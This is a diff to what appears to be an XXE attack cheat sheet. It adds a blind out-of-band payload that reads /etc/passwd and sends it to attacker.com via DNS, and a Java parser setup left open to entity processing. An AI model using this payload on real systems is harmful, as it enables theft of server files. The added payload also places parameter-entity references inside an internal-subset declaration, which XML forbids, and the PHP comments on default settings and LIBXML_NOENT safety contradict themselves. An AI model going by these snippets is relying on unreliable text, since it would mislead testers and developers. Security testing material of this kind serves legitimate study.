@@ -94,6 +94,17 @@ libxml2
 ```
 The file contents appear in the error message (if debug is enabled).
 
+### Blind XXE — OOB Exfiltration via DNS (Advanced)
+```xml
+<!DOCTYPE foo [
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://%file;.attacker.com/'>">
+  %eval;
+  %error;
+]>
+<root/>
+```
+
 ---
 
 ## 🎯 Content-Type Switching Attack
@@ -190,6 +201,14 @@ tree = etree.fromstring(xml_data, parser)
 libxml_disable_entity_loader(true);  // <= PHP 8.0, enabled by default since 8.0
 $doc = simplexml_load_string($xml, 'SimpleXMLElement', LIBXML_NOENT | LIBXML_DTDLOAD);
 // LIBXML_NOENT substitutes entities but is safe with libxml_disable_entity_loader active
+```
+
+### Modern JAXP Parser Bypass
+If the developer only disabled some features but not `disallow-doctype-decl`, the parser may still process internal entities or some external fragments:
+```java
+factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
+factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
+// factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true); // MISSING!
 ```
 
 ---
